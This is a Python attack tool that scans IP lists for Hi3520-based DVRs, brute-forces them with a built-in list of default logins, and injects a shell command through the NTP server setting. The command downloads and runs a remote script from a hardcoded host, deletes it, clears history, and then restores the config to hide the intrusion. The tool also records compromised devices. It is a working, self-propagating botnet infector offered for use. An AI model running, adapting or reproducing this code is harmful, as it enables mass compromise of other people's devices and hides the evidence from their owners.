#!/usr/bin/env python3

import sys
import time
import base64
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

PAYLOAD_URL = "http://100.100.100.100/bins/cirqueira.sh"
PAYLOAD_NAME = "cirqueira.sh"

status_attempted = 0
status_found = 0
status_logins = 0
status_vuln = 0
status_clean = 0
status_failed = 0

print_lock = Lock()
success_lock = Lock()
success_targets = []

paths = ["/dvr/cmd", "/cn/cmd"]
logins = ["admin:686868", "admin:baogiaan", "admin:555555", "admin123:admin123", "admin:888888",
          "root:toor", "toor:toor", "toor:root", "admin:admin@123", "admin:123456789",
          "root:admin", "guest:guest", "guest:123456", "report:8Jg0SR8K50", "admin:admin",
          "admin:123456", "root:123456", "admin:user", "admin:1234", "admin:password",
          "admin:12345", "admin:0000", "admin:1111", "admin:1234567890", "admin:123",
          "admin:", "admin:666666", "admin:admin123", "admin:administrator",
          "administartor:password", "admin:p@ssword"]

def create_session():
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    session.timeout = (10, 20)
    return session

def save_success(target, login, path):
    with success_lock:
        success_targets.append({
            'target': target,
            'login': login,
            'path': path,
            'timestamp': datetime.now().isoformat()
        })
        with open('success.txt', 'a') as f:
            f.write(f"{target} | {login} | {path}\n")

def check_device(session, target):
    try:
        url = f"http://{target}/"
        headers = {
            'User-Agent': 'Linux Gnu (cow)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        }
        response = session.get(url, headers=headers, timeout=(5, 10))
        
        if response.status_code == 401 and 'Basic realm=' in response.headers.get('WWW-Authenticate', ''):
            return True
        return False
    except:
        return False

def try_login(session, target, login):
    try:
        auth = base64.b64encode(login.encode()).decode()
        url = f"http://{target}/"
        headers = {
            'User-Agent': 'Linux Gnu (cow)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Authorization': f'Basic {auth}'
        }
        response = session.get(url, headers=headers, timeout=(5, 10))
        
        if response.status_code in [200, 302]:
            return True
        return False
    except:
        return False

def inject_payload(session, target, login, path, payload):
    try:
        auth = base64.b64encode(login.encode()).decode()
        url = f"http://{target}{path}"
        
        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520">
<SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?>
<DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" 
Server="time.nist.gov&{payload};echo DONE"/></Service></DVR>]]>
</SetConfiguration></DVR>'''
        
        headers = {
            'User-Agent': 'Linux Gnu (cow)',
            'Accept-Encoding': 'gzip, deflate',
            'Authorization': f'Basic {auth}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = session.post(url, data=xml_payload, headers=headers, timeout=(5, 30))
        
        if response.status_code in [200, 302]:
            return True
        return False
    except:
        return False

def clean_config(session, target, login, path):
    try:
        auth = base64.b64encode(login.encode()).decode()
        url = f"http://{target}{path}"
        
        clean_xml = '''<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520">
<SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?>
<DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" 
Server="time.nist.gov"/></Service></DVR>]]></SetConfiguration></DVR>'''
        
        headers = {
            'User-Agent': 'Linux Gnu (cow)',
            'Accept-Encoding': 'gzip, deflate',
            'Authorization': f'Basic {auth}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = session.post(url, data=clean_xml, headers=headers, timeout=(5, 10))
        
        if response.status_code in [200, 302]:
            return True
        return False
    except:
        return False

def process_target(target, payload_url, payload_name):
    global status_attempted, status_found, status_logins, status_vuln, status_clean, status_failed
    
    session = create_session()
    
    with print_lock:
        status_attempted += 1
    
    try:
        if not check_device(session, target):
            with print_lock:
                status_failed += 1
            return
        
        with print_lock:
            status_found += 1
        
        valid_login = None
        for login in logins:
            if try_login(session, target, login):
                valid_login = login
                with print_lock:
                    status_logins += 1
                break
        
        if not valid_login:
            return
        
        vuln_path = None
        for path in paths:
            if inject_payload(session, target, valid_login, path, f"cd /tmp || cd /run || cd /; wget {payload_url}; chmod 777 {payload_name}; sh {payload_name}; rm -rf {payload_name}; history -c"):
                vuln_path = path
                with print_lock:
                    status_vuln += 1
                break
        
        if vuln_path:
            save_success(target, valid_login, vuln_path)
            
            if clean_config(session, target, valid_login, vuln_path):
                with print_lock:
                    status_clean += 1
    
    except Exception as e:
        with print_lock:
            status_failed += 1
    
    finally:
        session.close()

def status_printer():
    i = 0
    while True:
        sys.stdout.write(f"\r[{i}s] Total: {status_attempted} | Found: {status_found} | Logins: {status_logins} | Vulnerable: {status_vuln} | Cleaned: {status_clean} | Failed: {status_failed}    ")
        sys.stdout.flush()
        time.sleep(1)
        i += 1

def main():
    parser = argparse.ArgumentParser(description='DVR Scanner')
    parser.add_argument('port', nargs='?', default='listen', help='Port to scan or "listen" for stdin input')
    parser.add_argument('--threads', type=int, default=50, help='Number of concurrent threads')
    parser.add_argument('--payload-url', default=PAYLOAD_URL, help='URL of the payload script')
    parser.add_argument('--payload-name', default=PAYLOAD_NAME, help='Name of the payload script')
    parser.add_argument('--output', default='success.txt', help='Output file for vulnerable targets')
    
    args = parser.parse_args()
    
    # CORREÇÃO: usar variáveis locais em vez de globais
    payload_url = args.payload_url
    payload_name = args.payload_name
    
    status_thread = threading.Thread(target=status_printer, daemon=True)
    status_thread.start()
    
    targets = []
    try:
        if args.port == "listen":
            for line in sys.stdin:
                line = line.strip()
                if line:
                    targets.append(line)
        else:
            for line in sys.stdin:
                line = line.strip()
                if line:
                    targets.append(f"{line}:{args.port}")
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for target in targets:
            future = executor.submit(process_target, target, payload_url, payload_name)
            futures.append(future)
        
        try:
            for future in as_completed(futures):
                pass
        except KeyboardInterrupt:
            print("\nShutting down...")
            executor.shutdown(wait=False)
            sys.exit(0)
    
    print(f"\n\nScan complete. Found {len(success_targets)} vulnerable targets.")
    print(f"Results saved to {args.output}")

if __name__ == "__main__":
    import threading
    main()
